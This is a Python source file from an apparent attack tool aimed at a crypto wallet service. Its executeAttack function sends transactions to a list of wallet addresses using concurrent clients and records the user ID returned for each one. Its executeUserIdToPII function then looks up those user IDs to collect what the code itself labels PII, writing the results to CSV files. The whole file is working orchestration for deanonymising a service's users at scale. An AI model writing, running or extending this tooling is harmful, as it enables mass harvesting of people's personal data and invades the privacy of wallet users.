import asyncio
import aiofiles
import aiocsv
import json
import asyncio
import logging
from datetime import datetime
from coin import CryptoCoin
from attack import CWalletClient
from parse import getDataFilePath, read_addresses, read_processed_addresses, read_processed_userIds, read_userIds_rows

logger = logging.getLogger(__name__)

lock = asyncio.Lock()

async def queue_worker(name: int, queue: asyncio.Queue, clients: list[CWalletClient], amount: str, coin: CryptoCoin, writer):
    while True:
        try:
            address = await queue.get()
        except asyncio.CancelledError:
            break

        client = clients[name % len(clients)]

        try:
            userId = await client.executeFullTransaction(address, amount, coin)

            # Get timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            print(f"Worker {name} processed address: {address}, result: {userId}")
            async with lock:
                await writer.writerow({
                    "address": address,
                    "userId": userId,
                    "timestamp": timestamp
                })
        except Exception as e:
            print(f"Worker {name} error: {e}")

        queue.task_done()


async def executeAttack(addressesFileName: str, resultsFileName: str, clients: list[CWalletClient], coin: CryptoCoin, amount: str) -> None:

    addresses_file = getDataFilePath(addressesFileName)
    results_file = getDataFilePath(resultsFileName)

    # 1️⃣ Read already processed
    processed_addresses = read_processed_addresses(results_file)

    # 2️⃣ Read all addresses
    all_addresses = read_addresses(addresses_file)

    # 3️⃣ Subtract (Method 3 – ordered filtering with set)
    remaining_addresses = [
        addr for addr in all_addresses
        if addr not in processed_addresses
    ]

    print(f"Total addresses: {len(all_addresses)}")
    print(f"Already processed: {len(processed_addresses)}")
    print(f"Remaining to process: {len(remaining_addresses)}")

    if not remaining_addresses:
        print("Nothing to process.")
        return

    # 4️⃣ Open results file in append mode
    file_exists = results_file.exists()

    async with aiofiles.open(results_file, mode="a", newline="") as afp:
        writer = aiocsv.AsyncDictWriter(
            afp,
            fieldnames = ["address", "userId", "timestamp"]
        )

        # Write header only if file didn't exist
        if not file_exists:
            await writer.writeheader()

        queue = asyncio.Queue()

        for addr in remaining_addresses:
            queue.put_nowait(addr)

        NUM_WORKERS =len(clients) * 5  # tune this

        workers = [
            asyncio.create_task(
                queue_worker(i, queue, clients, amount, coin, writer)
            )
            for i in range(NUM_WORKERS)
        ]

        await queue.join()

        for w in workers:
            w.cancel()
        
        await asyncio.gather(*workers, return_exceptions=True)



#################################################
###           USER ID DATA EXTRACTION         ###
#################################################

lock_userId = asyncio.Lock()


async def queue_worker_userId(name: int, queue: asyncio.Queue, clients: list[CWalletClient], writer):
    counter = 0
    while True:
        try:
            userId_row = await queue.get()
        except asyncio.CancelledError:
            break

        client = clients[name % len(clients)]

        try:
            userId_data = await client.getUserData(userId_row["userId"])

            counter += 1
            print(f"counter: {counter}")
            print(f"Worker {name} processed userId: {userId_row['userId']}, result: {userId_data}")

            async with lock_userId:
                await writer.writerow({
                    "address": userId_row["address"],
                    "result": json.dumps(userId_data),
                    "timestamp": userId_row["timestamp"]
                })
        except Exception as e:
            logger.debug(f"Worker {name} error: {e} | userId_row: {userId_row} | counter: {counter}")
            print(f"Worker {name} error: {e} | userId_row: {userId_row} | counter: {counter}")
            queue.task_done()
            break
        queue.task_done()

async def executeUserIdToPII(userIdsFileName: str, resultsFileName: str, clients: list[CWalletClient]) -> None:

    userIds_file = getDataFilePath(userIdsFileName)
    results_file = getDataFilePath(resultsFileName)

    # 1️⃣ Read already processed
    processed_userIds = read_processed_addresses(results_file)

    # 2️⃣ Read all userIds rows
    all_userId_rows = read_userIds_rows(userIds_file)

    # 3️⃣ Subtract (Method 3 – ordered filtering with set)
    remaining_userId_rows = [
        userId_row for userId_row in all_userId_rows
        if userId_row["address"] not in processed_userIds
    ]

    print(f"Total userIds: {len(all_userId_rows)}")
    print(f"Already processed: {len(processed_userIds)}")
    print(f"Remaining to process: {len(remaining_userId_rows)}")

    if not remaining_userId_rows:
        print("Nothing to process.")
        return

    # 4️⃣ Open results file in append mode
    file_exists = results_file.exists()

    async with aiofiles.open(results_file, mode="a", newline="") as afp:
        writer = aiocsv.AsyncDictWriter(
            afp,
            fieldnames = ["address", "result", "timestamp"]
        )

        # Write header only if file didn't exist
        if not file_exists:
            await writer.writeheader()

        queue = asyncio.Queue()

        for userId_row in remaining_userId_rows:
            queue.put_nowait(userId_row)

        NUM_WORKERS =len(clients) * 1  # tune this

        workers = [
            asyncio.create_task(
                queue_worker_userId(i, queue, clients, writer)
            )
            for i in range(NUM_WORKERS)
        ]

        await queue.join()

        for w in workers:
            w.cancel()
        
        await asyncio.gather(*workers, return_exceptions=True)